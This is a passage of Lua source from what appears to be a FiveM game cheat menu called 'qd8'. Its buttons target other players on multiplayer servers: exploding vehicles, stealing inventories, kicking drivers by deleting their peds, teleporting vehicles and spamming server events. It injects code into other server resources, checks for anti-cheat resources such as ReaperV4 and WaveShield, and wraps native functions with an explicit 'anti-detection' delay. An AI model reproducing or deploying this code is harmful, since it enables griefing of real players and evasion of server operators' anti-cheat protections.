                                                    targetPos.x, targetPos.y, targetPos.z + 1.0, -- Start near target ped
                                                    vehicleCoords.x, vehicleCoords.y, vehicleCoords.z + 0.3, -- Aim at vehicle center (tighter offset)
                                                    2000.0, true, pistolHash, localPlayerPed, true, false, 2000.0 -- Higher speed for accuracy
                                                )
                                                wait(1) -- Slightly slower shooting for stability
                                            end

                                            removeWeapon(localPlayerPed, pistolHash)
                                        ]]
                                        MachoInjectResourceRaw("any", script, targetPlayer)
                                        self:Notify("success", "qd8", "Attempting to Explode Player", 5000)
                                    end
                                end

                                qd8:UpdateListMenu()
                            end
                        },
                        { type = "button", label = "Steal Inventory", desc = 'This will attempt to open the selected players inventory',
                            onSelect = function()
                                local targetPlayers = {}
                                for serverId, checked in pairs(CPlayers) do
                                    if checked then
                                        targetPlayers[#targetPlayers + 1] = serverId
                                    end
                                end

                                if #targetPlayers == 0 then
                                    self:Notify("error", "qd8", "You must select a player to do this!", 3000)
                                    return
                                end

                                self:HandleTakeInventory(targetPlayers)
                                self:Notify("success", "qd8", "Attempting to steal inventory", 5000)
                            end
                        },
                        { type = "divider", label = "Ped Options" },
                        { type = "button", label = "Clone Player",
                            onSelect = function()
                                local targetPlayers = {}
                                for serverId, checked in pairs(CPlayers) do
                                    if checked then
                                        targetPlayers[#targetPlayers + 1] = serverId
                                    end
                                end

                                if #targetPlayers == 0 then
                                    self:Notify("error", "qd8", "You must select a player to do this!", 3000)
                                    return
                                end

                                self:HandleClonePlayer(targetPlayers)
                                self:Notify("success", "qd8", "Cloned Player", 5000)
                            end
                        },
                        { type = "button", label = "Attack Clone Player",
                            onSelect = function()
                                local targetPlayers = {}
                                for serverId, checked in pairs(CPlayers) do
                                    if checked then
                                        targetPlayers[#targetPlayers + 1] = serverId
                                    end
                                end

                                if #targetPlayers == 0 then
                                    self:Notify("error", "qd8", "You must select a player to do this!", 3000)
                                    return
                                end

                                self:HandleAttackClonePlayer(targetPlayers)
                                self:Notify("success", "qd8", "Cloned Player", 5000)
                            end
                        },
                        { type = "divider", label = "Vehicle Options" },
                        {
                            type = "scrollable", 
                            label = "Attach Vehicle", 
                            scrollType = "onEnter", 
                            value = 1, 
                            values = { 
                                "bmx", "sanchez", "adder", "blista", "sultan", "faggio", "bati", "pcj",
                                "oppressor", "maverick", "buzzard", "cargobob", "t20", "comet", "kuruma",
                                "zentorno", "entityxf", "carbonizzare", "elegy", "massacro", "vagner",
                                "nightshark", "banshee", "feltzer2", "ruston", "bullet", "elegy2"
                            },
                            onSelect = function(value)
                                local targetPlayers = {}
                                for serverId, checked in pairs(CPlayers) do
                                    if checked then
                                        targetPlayers[#targetPlayers + 1] = serverId
                                    end
                                end
                                if #targetPlayers == 0 then
                                    self:Notify("error", "qd8", "You must select a player to do this!", 3000)
                                    return
                                end
                                qd8:AttachSelectedVehicle(targetPlayers, value)
                                self:Notify("success", "qd8", "Vehicle Attached to " .. #targetPlayers .. " Player(s)", 5000)
                            end
                        },
                        { type = "divider", label = "Object Options" },
                        {
                            type = "scrollable",
                            label = "Vehicle Object",
                            scrollType = "onEnter",
                            value = 1,
                            values = {
                                "bmx", "sanchez", "adder", "blista", "sultan", "faggio", "bati", "pcj",
                                "oppressor", "maverick", "buzzard", "cargobob", "t20", "comet",
                                "zentorno", "tampa", "nightshark", "kuruma", "buffalo", "massacro",
                                "ferrari", "comet2", "issi2", "vindicator", "baller", "baller2"
                            },
                            onSelect = function(value)
                                local targetPlayers = {}
                                for serverId, checked in pairs(CPlayers) do
                                    if checked then
                                        targetPlayers[#targetPlayers + 1] = serverId
                                    end
                                end

                                if #targetPlayers == 0 then
                                    self:Notify("error", "qd8", "You must select at least one player!", 3000)
                                    return
                                end

                                function qd8:GetSelectedObjectModel()
                                    return value
                                end

                                qd8:SpawnSelectedObject(targetPlayers)
                            end
                        },
                        {
                            type = "scrollable",
                            label = "Attach Prop",
                            scrollType = "onEnter",
                            value = 1,
                            values = {
                                "prop_barrel_02a", "prop_cone_float_1", "prop_chair_01a", "prop_boombox_01",
                                "prop_tool_broom", "prop_golf_ball", "prop_laptop_01a", "prop_trafficcone_01a",
                                "prop_pizza_box_01", "prop_mb_cargo_01a", "prop_ld_crate_01a", "prop_ld_fueldoor",
                                "prop_ld_greenscreen_01", "prop_ld_shovel", "prop_snow_bottle", "prop_snow_locker_01",
                                "prop_dummy_01", "prop_dummy_02"
                            },
                            onSelect = function(value)
                                local targetPlayers = {}
                                for serverId, checked in pairs(CPlayers) do
                                    if checked then
                                        targetPlayers[#targetPlayers + 1] = serverId
                                    end
                                end

                                if #targetPlayers == 0 then
                                    self:Notify("error", "qd8", "You must select at least one player!", 3000)
                                    return
                                end

                                function qd8:GetSelectedObjectModel()
                                    return value
                                end

                                qd8:SpawnSelectedObject(targetPlayers)

                                self:Notify("success", "qd8", "Spawned object '" .. tostring(value) .. "' for " .. #targetPlayers .. " player(s).", 5000)
                            end
                        },
                        {
                            type = "scrollable",
                            label = "Attach Furniture",
                            scrollType = "onEnter",
                            value = 1,
                            values = {
                                "prop_table_01", "prop_table_02", "prop_table_03", "prop_chair_02",
                                "prop_chair_03", "prop_chair_04a", "prop_sofa_01", "prop_sofa_02",
                                "prop_sofa_03", "prop_bed_01", "prop_bed_02", "prop_lamp_01",
                                "prop_lamp_02", "prop_lamp_03", "prop_couch_01", "prop_couch_02",
                                "prop_tv_01", "prop_tv_02", "prop_tv_03", "prop_computer_01",
                                "prop_computer_02", "prop_monitor_01", "prop_monitor_02"
                            },
                            onSelect = function(value)
                                local targetPlayers = {}
                                for serverId, checked in pairs(CPlayers) do
                                    if checked then
                                        targetPlayers[#targetPlayers + 1] = serverId
                                    end
                                end

                                if #targetPlayers == 0 then
                                    self:Notify("error", "qd8", "You must select at least one player!", 3000)
                                    return
                                end

                                function qd8:GetSelectedObjectModel()
                                    return value
                                end

                                qd8:SpawnSelectedObject(targetPlayers)
                            end
                        },
                        {
                            type = "scrollable",
                            label = "Attach Misc",
                            scrollType = "onEnter",
                            value = 1,
                            values = {
                                "prop_beer_bottle", "prop_soda_cup", "prop_papercup_01", "prop_cup_coffee_01",
                                "prop_champ_flute", "prop_cs_burger_01", "prop_cs_burger_02", "prop_cs_hotdog_01",
                                "prop_cs_pizza_01", "prop_cs_sandwich_01", "prop_cs_juice_01"
                            },
                            onSelect = function(value)
                                local targetPlayers = {}
                                for serverId, checked in pairs(CPlayers) do
                                    if checked then
                                        targetPlayers[#targetPlayers + 1] = serverId
                                    end
                                end

                                if #targetPlayers == 0 then
                                    self:Notify("error", "qd8", "You must select at least one player!", 3000)
                                    return
                                end

                                function qd8:GetSelectedObjectModel()
                                    return value
                                end

                                qd8:SpawnSelectedObject(targetPlayers)

                                self:Notify("success", "qd8", "Spawned object '" .. tostring(value) .. "' for " .. #targetPlayers .. " player(s).", 5000)
                            end
                        },

                    }
                },
                {
                    label = "Vehicle",
                    tabs = {
                        { type = "button", label = "Kick From Vehicle",
                            onSelect = function()
                                local targetPlayer = nil
                                for serverId, checked in pairs(CPlayers) do
                                    if checked then
                                        targetPlayer = serverId
                                        break
                                    end
                                end

                                if targetPlayer then
                                    local player = GetPlayerFromServerId(targetPlayer)
                                    if player == -1 then
                                        self:Notify("error", "qd8", "There was an error while trying to kick the player from their vehicle! (ERR:1)", 3000)
                                        CPlayers[targetPlayer] = nil
                                        qd8:UpdateListMenu()
                                        return
                                    end

                                    if not DoesEntityExist(GetVehiclePedIsUsing(GetPlayerPed(player))) then
                                        self:Notify("error", "qd8", "There was an error while trying to kick the player from their vehicle! (ERR:2)", 3000)
                                        return
                                    end

                                    if GetResourceState("ReaperV4") ~= "started" or GetCurrentServerEndpoint() == "216.146.24.88:30120" then
                                        for i = 1, 2 do
                                        MachoInjectResourceRaw(GetResourceState("911elemento") == "started" and "monitor" or "any", [[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then
                                                    return
                                                end
                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

                                            hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                            hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                            hNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
                                            hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                                            hNative("GetCamCoord", function(originalFn, ...) return originalFn(...) end)
                                            hNative("GetCamRot", function(originalFn, ...) return originalFn(...) end)
                                            hNative("StartShapeTestRay", function(originalFn, ...) return originalFn(...) end)
                                            hNative("GetShapeTestResult", function(originalFn, ...) return originalFn(...) end)
                                            hNative("GetPedInVehicleSeat", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetEntityVisible", function(originalFn, ...) return originalFn(...) end)
                                            hNative("DeletePed", function(originalFn, ...) return originalFn(...) end)
                                            hNative("ClearPedTasksImmediately", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetEntityCoordsNoOffset", function(originalFn, ...) return originalFn(...) end)
                                            hNative("IsEntityAVehicle", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                                            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                                            hNative("NetworkRequestControlOfEntity", function(originalFn, ...) return originalFn(...) end)
                                            hNative("NetworkHasControlOfEntity", function(originalFn, ...) return originalFn(...) end)

                                            local function RequestControl(entity, timeoutMs)
                                                timeoutMs = timeoutMs or 2000
                                                local start = GetGameTimer()

                                                while (GetGameTimer() - start) < timeoutMs do
                                                    if NetworkHasControlOfEntity(entity) then return true end
                                                    NetworkRequestControlOfEntity(entity)
                                                    Wait(0)
                                                end

                                                return NetworkHasControlOfEntity(entity)
                                            end

                                            local function RotationToDirection(rot)
                                                local z = math.rad(rot.z)
                                                local x = math.rad(rot.x)
                                                local num = math.abs(math.cos(x))
                                                return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                                            end

                                            function GetEmptySeat(vehicle)
                                                local seats = { -1, 0, 1, 2 }

                                                for _, seat in ipairs(seats) do
                                                    if IsVehicleSeatFree(vehicle, seat) then
                                                        return seat
                                                    end
                                                end

                                                return -1
                                            end

                                            local player = PlayerPedId()

                                            local function KickFromVehicleNewestV8(vehicle)
                                                if not vehicle or not DoesEntityExist(vehicle) then
                                                    return
                                                end

                                                local driver = GetPedInVehicleSeat(vehicle, -1)
                                                if driver ~= 0 and DoesEntityExist(driver) then
                                                    for i = 1, 1 do
                                                        SetPedIntoVehicle(player, vehicle, 0)
                                                        RequestControl(vehicle, 10)
                                                        DeletePed(driver)
                                                        SetPedIntoVehicle(player, vehicle, -1)
                                                        Wait(25)
                                                        TaskLeaveVehicle(player, vehicle, 16)
                                                        Wait(450)
                                                        -- DeleteEntity(vehicle)
                                                    end

                                                    Wait(100)
                                                end
                                            end

                                            CreateThread(function()
                                                local entityHit = ]] .. GetVehiclePedIsUsing(GetPlayerPed(player)) .. [[

                                                print(entityHit)

                                                if entityHit ~= 0 and IsEntityAVehicle(entityHit) then
                                                    KickFromVehicleNewestV8(entityHit)
                                                end
                                            end)
                                        ]])
                                        end

                                        -- MachoInjectResourceRaw(GetResourceState("911elemento") == "started" and "monitor" or "any", [[
                                        --     function hNative(nativeName, newFunction)
                                        --         local originalNative = _G[nativeName]
                                        --         if not originalNative or type(originalNative) ~= "function" then
                                        --             return
                                        --         end
                                        --         _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                        --     end

                                        --     hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                        --     hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                        --     hNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
                                        --     hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                                        --     hNative("GetCamCoord", function(originalFn, ...) return originalFn(...) end)
                                        --     hNative("GetCamRot", function(originalFn, ...) return originalFn(...) end)
                                        --     hNative("StartShapeTestRay", function(originalFn, ...) return originalFn(...) end)
                                        --     hNative("GetShapeTestResult", function(originalFn, ...) return originalFn(...) end)
                                        --     hNative("GetPedInVehicleSeat", function(originalFn, ...) return originalFn(...) end)
                                        --     hNative("SetEntityVisible", function(originalFn, ...) return originalFn(...) end)
                                        --     hNative("DeletePed", function(originalFn, ...) return originalFn(...) end)
                                        --     hNative("ClearPedTasksImmediately", function(originalFn, ...) return originalFn(...) end)
                                        --     hNative("SetEntityCoordsNoOffset", function(originalFn, ...) return originalFn(...) end)
                                        --     hNative("IsEntityAVehicle", function(originalFn, ...) return originalFn(...) end)
                                        --     hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                                        --     hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                                        --     hNative("NetworkRequestControlOfEntity", function(originalFn, ...) return originalFn(...) end)
                                        --     hNative("NetworkHasControlOfEntity", function(originalFn, ...) return originalFn(...) end)

                                        --     local function RequestControl(entity, timeoutMs)
                                        --         timeoutMs = timeoutMs or 2000
                                        --         local start = GetGameTimer()

                                        --         while (GetGameTimer() - start) < timeoutMs do
                                        --             if NetworkHasControlOfEntity(entity) then return true end
                                        --             NetworkRequestControlOfEntity(entity)
                                        --             Wait(0)
                                        --         end

                                        --         return NetworkHasControlOfEntity(entity)
                                        --     end

                                        --     local function RotationToDirection(rot)
                                        --         local z = math.rad(rot.z)
                                        --         local x = math.rad(rot.x)
                                        --         local num = math.abs(math.cos(x))
                                        --         return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                                        --     end

                                        --     function GetEmptySeat(vehicle)
                                        --         local seats = { -1, 0, 1, 2 }

                                        --         for _, seat in ipairs(seats) do
                                        --             if IsVehicleSeatFree(vehicle, seat) then
                                        --                 return seat
                                        --             end
                                        --         end

                                        --         return -1
                                        --     end

                                        --     local player = PlayerPedId()
                                        --     local oldCoords = GetEntityCoords(player)

                                        --     local function KickFromVehicle(vehicle)
                                        --         if not vehicle or not DoesEntityExist(vehicle) then
                                        --             return
                                        --         end

                                        --         local driver = GetPedInVehicleSeat(vehicle, -1)
                                        --         if driver ~= 0 and DoesEntityExist(driver) then
                                        --             SetPedIntoVehicle(player, vehicle, 0)
                                        --             RequestControl(vehicle, 2000)
                                        --             Wait(10)

                                        --             for i = 0, 4 do
                                        --                 DeletePed(driver)
                                        --             end

                                        --             Wait(40)
                                        --             SetPedIntoVehicle(player, vehicle, -1)
                                        --             Wait(1)
                                        --             SetPedIntoVehicle(player, vehicle, GetEmptySeat(vehicle))
                                        --             Wait(1)
                                        --             SetPedIntoVehicle(player, vehicle, -1)
                                        --             TaskLeaveVehicle(player, vehicle, 16)
                                        --             Wait(450)
                                        --             ClearPedTasksImmediately(player)
                                        --             SetEntityCoordsNoOffset(player, oldCoords.x, oldCoords.y, oldCoords.z, true, true, true, true)
                                        --             Wait(100)
                                        --         end
                                        --     end

                                        --     CreateThread(function()
                                        --         local entityHit = ]] .. GetVehiclePedIsUsing(GetPlayerPed(player)) .. [[

                                        --         print(entityHit)

                                        --         if entityHit ~= 0 and IsEntityAVehicle(entityHit) then
                                        --             KickFromVehicle(entityHit)
                                        --         end
                                        --     end)
                                        -- ]])
                                    else
                                        return
                                    end

                                    CPlayers[targetPlayer] = true
                                    self:UpdateListMenu()
                                else
                                    self:Notify("error", "qd8", "You must select a player to do this!", 3000)
                                end
                            end
                        },
                        { type = "button", label = "Teleport to Ocean",
                            onSelect = function()
                                local targetPlayer = nil
                                for serverId, checked in pairs(CPlayers) do
                                    if checked then
                                        targetPlayer = serverId
                                        break
                                    end
                                end

                                if targetPlayer then
                                    local player = GetPlayerFromServerId(targetPlayer)
                                    if player == -1 then
                                        self:Notify("error", "qd8", "There was an error while trying to kick the player from their vehicle! (ERR:1)", 3000)
                                        CPlayers[targetPlayer] = nil
                                        qd8:UpdateListMenu()
                                        return
                                    end

                                    if not DoesEntityExist(GetVehiclePedIsUsing(GetPlayerPed(player))) then
                                        self:Notify("error", "qd8", "There was an error while trying to kick the player from their vehicle! (ERR:2)", 3000)
                                        return
                                    end

                                    if GetResourceState("ReaperV4") ~= "started" or GetCurrentServerEndpoint() == "216.146.24.88:30120" then
                                        for i = 1, 2 do
                                        MachoInjectResourceRaw(GetResourceState("911elemento") == "started" and "monitor" or "any", [[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then
                                                    return
                                                end
                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

                                            hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                            hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                            hNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
                                            hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                                            hNative("GetCamCoord", function(originalFn, ...) return originalFn(...) end)
                                            hNative("GetCamRot", function(originalFn, ...) return originalFn(...) end)
                                            hNative("StartShapeTestRay", function(originalFn, ...) return originalFn(...) end)
                                            hNative("GetShapeTestResult", function(originalFn, ...) return originalFn(...) end)
                                            hNative("GetPedInVehicleSeat", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetEntityVisible", function(originalFn, ...) return originalFn(...) end)
                                            hNative("DeletePed", function(originalFn, ...) return originalFn(...) end)
                                            hNative("ClearPedTasksImmediately", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetEntityCoordsNoOffset", function(originalFn, ...) return originalFn(...) end)
                                            hNative("IsEntityAVehicle", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                                            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                                            hNative("NetworkRequestControlOfEntity", function(originalFn, ...) return originalFn(...) end)
                                            hNative("NetworkHasControlOfEntity", function(originalFn, ...) return originalFn(...) end)

                                            local function RequestControl(entity, timeoutMs)
                                                timeoutMs = timeoutMs or 2000
                                                local start = GetGameTimer()

                                                while (GetGameTimer() - start) < timeoutMs do
                                                    if NetworkHasControlOfEntity(entity) then return true end
                                                    NetworkRequestControlOfEntity(entity)
                                                    Wait(0)
                                                end

                                                return NetworkHasControlOfEntity(entity)
                                            end

                                            local function RotationToDirection(rot)
                                                local z = math.rad(rot.z)
                                                local x = math.rad(rot.x)
                                                local num = math.abs(math.cos(x))
                                                return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                                            end

                                            function GetEmptySeat(vehicle)
                                                local seats = { -1, 0, 1, 2 }

                                                for _, seat in ipairs(seats) do
                                                    if IsVehicleSeatFree(vehicle, seat) then
                                                        return seat
                                                    end
                                                end

                                                return -1
                                            end

                                            local player = PlayerPedId()

                                            local function TeleportVehicleToOcean(vehicle)
                                                if not vehicle or not DoesEntityExist(vehicle) then
                                                    return
                                                end

                                                local driver = GetPedInVehicleSeat(vehicle, -1)
                                                if driver ~= 0 and DoesEntityExist(driver) then
                                                    for i = 1, 1 do
                                                        SetPedIntoVehicle(player, vehicle, 0)
                                                        RequestControl(vehicle, 10)
                                                        DeletePed(driver)
                                                        SetPedIntoVehicle(player, vehicle, -1)
                                                        Wait(25)
                                                        SetEntityCoords(vehicle, 0.0, 0.0, 0.0, false, false, false, false)
                                                        -- DeleteEntity(vehicle)
                                                    end

                                                    Wait(100)
                                                end
                                            end

                                            CreateThread(function()
                                                local entityHit = ]] .. GetVehiclePedIsUsing(GetPlayerPed(player)) .. [[

                                                print(entityHit)

                                                if entityHit ~= 0 and IsEntityAVehicle(entityHit) then
                                                    TeleportVehicleToOcean(entityHit)
                                                end
                                            end)
                                        ]])
                                        end

                                        -- MachoInjectResourceRaw(GetResourceState("911elemento") == "started" and "monitor" or "any", [[
                                        --     function hNative(nativeName, newFunction)
                                        --         local originalNative = _G[nativeName]
                                        --         if not originalNative or type(originalNative) ~= "function" then
                                        --             return
                                        --         end
                                        --         _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                        --     end

                                        --     hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                        --     hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                        --     hNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
                                        --     hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                                        --     hNative("GetCamCoord", function(originalFn, ...) return originalFn(...) end)
                                        --     hNative("GetCamRot", function(originalFn, ...) return originalFn(...) end)
                                        --     hNative("StartShapeTestRay", function(originalFn, ...) return originalFn(...) end)
                                        --     hNative("GetShapeTestResult", function(originalFn, ...) return originalFn(...) end)
                                        --     hNative("GetPedInVehicleSeat", function(originalFn, ...) return originalFn(...) end)
                                        --     hNative("SetEntityVisible", function(originalFn, ...) return originalFn(...) end)
                                        --     hNative("DeletePed", function(originalFn, ...) return originalFn(...) end)
                                        --     hNative("ClearPedTasksImmediately", function(originalFn, ...) return originalFn(...) end)
                                        --     hNative("SetEntityCoordsNoOffset", function(originalFn, ...) return originalFn(...) end)
                                        --     hNative("IsEntityAVehicle", function(originalFn, ...) return originalFn(...) end)
                                        --     hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                                        --     hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                                        --     hNative("NetworkRequestControlOfEntity", function(originalFn, ...) return originalFn(...) end)
                                        --     hNative("NetworkHasControlOfEntity", function(originalFn, ...) return originalFn(...) end)

                                        --     local function RequestControl(entity, timeoutMs)
                                        --         timeoutMs = timeoutMs or 2000
                                        --         local start = GetGameTimer()

                                        --         while (GetGameTimer() - start) < timeoutMs do
                                        --             if NetworkHasControlOfEntity(entity) then return true end
                                        --             NetworkRequestControlOfEntity(entity)
                                        --             Wait(0)
                                        --         end

                                        --         return NetworkHasControlOfEntity(entity)
                                        --     end

                                        --     local function RotationToDirection(rot)
                                        --         local z = math.rad(rot.z)
                                        --         local x = math.rad(rot.x)
                                        --         local num = math.abs(math.cos(x))
                                        --         return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                                        --     end

                                        --     function GetEmptySeat(vehicle)
                                        --         local seats = { -1, 0, 1, 2 }

                                        --         for _, seat in ipairs(seats) do
                                        --             if IsVehicleSeatFree(vehicle, seat) then
                                        --                 return seat
                                        --             end
                                        --         end

                                        --         return -1
                                        --     end

                                        --     local player = PlayerPedId()
                                        --     local oldCoords = GetEntityCoords(player)

                                        --     local function KickFromVehicle(vehicle)
                                        --         if not vehicle or not DoesEntityExist(vehicle) then
                                        --             return
                                        --         end

                                        --         local driver = GetPedInVehicleSeat(vehicle, -1)
                                        --         if driver ~= 0 and DoesEntityExist(driver) then
                                        --             SetPedIntoVehicle(player, vehicle, 0)
                                        --             RequestControl(vehicle, 2000)
                                        --             Wait(10)

                                        --             for i = 0, 4 do
                                        --                 DeletePed(driver)
                                        --             end

                                        --             Wait(40)
                                        --             SetPedIntoVehicle(player, vehicle, -1)
                                        --             Wait(1)
                                        --             SetPedIntoVehicle(player, vehicle, GetEmptySeat(vehicle))
                                        --             Wait(1)
                                        --             SetPedIntoVehicle(player, vehicle, -1)
                                        --             TaskLeaveVehicle(player, vehicle, 16)
                                        --             Wait(450)
                                        --             ClearPedTasksImmediately(player)
                                        --             SetEntityCoordsNoOffset(player, oldCoords.x, oldCoords.y, oldCoords.z, true, true, true, true)
                                        --             Wait(100)
                                        --         end
                                        --     end

                                        --     CreateThread(function()
                                        --         local entityHit = ]] .. GetVehiclePedIsUsing(GetPlayerPed(player)) .. [[

                                        --         print(entityHit)

                                        --         if entityHit ~= 0 and IsEntityAVehicle(entityHit) then
                                        --             KickFromVehicle(entityHit)
                                        --         end
                                        --     end)
                                        -- ]])
                                    else
                                        return
                                    end

                                    CPlayers[targetPlayer] = true
                                    self:UpdateListMenu()
                                else
                                    self:Notify("error", "qd8", "You must select a player to do this!", 3000)
                                end
                            end
                        },
                    }
                },
                {
                    label = "Triggers",
                    tabs = {
                    { type = "checkbox", label = "Server Console Spam", checked = false,
                        onSelect = function(checked)
                            if checked then
                                print('Console Spam Started...')
                                Injection(GetResourceState("monitor") == "started" and "monitor" or GetResourceState("WaveShield") == "started" and "WaveShield" or "any", [[
                                    if not _G.qd8ServerConsoleSpamInitialized then
                                        _G.qd8ServerConsoleSpamEnabled = true
                                        _G.qd8ServerConsoleSpamInitialized = true

                                        local function HookNative(nativeName, newFunction)
                                            local originalNative = _G[nativeName]
                                            if not originalNative or type(originalNative) ~= "function" then return end
                                            _G[nativeName] = function(...)
                                                return newFunction(originalNative, ...)
                                            end
                                        end

                                        HookNative("CreateThread", function(fn, cb) return fn(cb) end)
                                        HookNative("Wait", function(fn, ms) return fn(ms) end)
                                        HookNative("TriggerEvent", function(fn, ...) return fn(...) end)
                                        HookNative("TriggerServerEvent", function(fn, ...) return fn(...) end)

                                        if not _G.qd8 then
                                            _G.qd8 = {
                                                TEvent = function(e, ...) return TriggerEvent(e, ...) end,
                                                TSEvent = function(e, ...) return TriggerServerEvent(e, ...) end
                                            }
                                        end

                                        local function initFlow(cb)
                                            local co = coroutine.create(cb)
                                            local ok, err
                                            while coroutine.status(co) ~= "dead" do
                                                ok, err = coroutine.resume(co)
                                                if not ok then
                                                    print("WaveShield Spam Coroutine error:", err)
                                                    break
                                                end
                                                Citizen.Wait(0)
                                            end
                                        end

                                        initFlow(function()
                                            Citizen.Wait(500) -- Anti-detection delay
                                            while _G.qd8ServerConsoleSpamInitialized do
                                                if not _G.qd8ServerConsoleSpamEnabled then
                                                    Citizen.Wait(500)
                                                else
                                                    _G.qd8.TSEvent("playerLoaded")
                                                    Citizen.Wait(75)
                                                end
                                            end
                                        end)
                                    else
                                        _G.qd8ServerConsoleSpamEnabled = true
                                    end
                                ]])
                            else
                                print('Console Spam Stopped...')
                                Injection(GetResourceState("monitor") == "started" and "monitor" or GetResourceState("WaveShield") == "started" and "WaveShield" or "any", [[
                                    _G.qd8ServerConsoleSpamEnabled = false
                                ]])
                            end
                        end
                    },
                    }
                },
            }
        },
        {
            icon = "",
            label = "Weapon",
            type = "subMenu",
            categories = {
                {
                    label = "Spawner",
                    tabs = {
                        { type = "button", label = "Give Weapon",
                            onSelect = function()
                                KeyboardInput("Weapon Name", "WEAPON_", function(val)
                                    if val and val ~= "" then
                                        self:SpawnSelectedWeapon(val)
                                    end
                                end, "typeable")
                            end
                        },
                        { type = "button", label = "Give All Weapons",
                            onSelect = function()
                                self:GiveAllWeapons()
                            end
                        },
                        { type = "button", label = "Remove All Weapons",
                            onSelect = function()
                                self:RemoveAllWeapons()
                            end
                        },
                        { type = "divider", label = "All Weapons" },
                        { type = "scrollable", label = "Melee", scrollType = "onEnter", value = 1, values = self:BuildMenuFromWeaponList({ "weapon_unarmed", "weapon_knife", "weapon_dagger", "weapon_bat", "weapon_bottle", "weapon_crowbar", "weapon_golfclub", "weapon_hammer", "weapon_hatchet", "weapon_machete", "weapon_switchblade", "weapon_nightstick", "weapon_wrench" }),
                            onSelect = function(value) self:SpawnSelectedWeapon(self:GetWeaponModelFromLabel(value)) end
                        },
                        { type = "scrollable", label = "Handguns", scrollType = "onEnter", value = 1, values = self:BuildMenuFromWeaponList({ "weapon_pistol", "weapon_pistol_mk2", "weapon_combatpistol", "weapon_appistol", "weapon_stungun", "weapon_pistol50", "weapon_snspistol", "weapon_heavypistol", "weapon_vintagepistol", "weapon_flaregun" }),
                            onSelect = function(value) self:SpawnSelectedWeapon(self:GetWeaponModelFromLabel(value)) end
                        },
                        { type = "scrollable", label = "SMGs", scrollType = "onEnter", value = 1, values = self:BuildMenuFromWeaponList({ "weapon_microsmg", "weapon_smg", "weapon_smg_mk2", "weapon_assaultsmg", "weapon_machinepistol", "weapon_minismg", "weapon_combatpdw" }),
                            onSelect = function(value) self:SpawnSelectedWeapon(self:GetWeaponModelFromLabel(value)) end
                        },
                        { type = "scrollable", label = "Rifles", scrollType = "onEnter", value = 1, values = self:BuildMenuFromWeaponList({ "weapon_assaultrifle", "weapon_assaultrifle_mk2", "weapon_carbinerifle", "weapon_carbinerifle_mk2", "weapon_advancedrifle", "weapon_specialcarbine", "weapon_bullpuprifle", "weapon_gusenberg", "weapon_compactrifle", "weapon_bullpuprifle_mk2", "weapon_marksmanrifle" }),
                            onSelect = function(value) self:SpawnSelectedWeapon(self:GetWeaponModelFromLabel(value)) end
                        },
                        { type = "scrollable", label = "Shotguns", scrollType = "onEnter", value = 1, values = self:BuildMenuFromWeaponList({ "weapon_pumpshotgun", "weapon_pumpshotgun_mk2", "weapon_sawnoffshotgun", "weapon_assaultshotgun", "weapon_bullpupshotgun", "weapon_heavyshotgun", "weapon_autoshotgun" }),
                            onSelect = function(value) self:SpawnSelectedWeapon(self:GetWeaponModelFromLabel(value)) end
                        },
                        { type = "scrollable", label = "Snipers", scrollType = "onEnter", value = 1, values = self:BuildMenuFromWeaponList({ "weapon_sniperrifle", "weapon_heavysniper", "weapon_heavysniper_mk2", "weapon_marksmanrifle", "weapon_marksmanrifle_mk2" }),
                            onSelect = function(value) self:SpawnSelectedWeapon(self:GetWeaponModelFromLabel(value)) end
                        },
                        { type = "scrollable", label = "Explosives", scrollType = "onEnter", value = 1, values = self:BuildMenuFromWeaponList({ "weapon_grenade", "weapon_stickybomb", "weapon_molotov", "weapon_pipebomb", "weapon_proxmine", "weapon_rpg", "weapon_grenadelauncher", "weapon_rpg", "weapon_minigun", "weapon_firework" }),
                            onSelect = function(value) self:SpawnSelectedWeapon(self:GetWeaponModelFromLabel(value)) end
                        },
                        { type = "scrollable", label = "Heavy", scrollType = "onEnter", value = 1, values = self:BuildMenuFromWeaponList({ "weapon_mg", "weapon_combatmg", "weapon_gusenberg", "weapon_minigun", "weapon_grenadelauncher", "weapon_railgun", "weapon_hominglauncher", "weapon_compactlauncher" }),
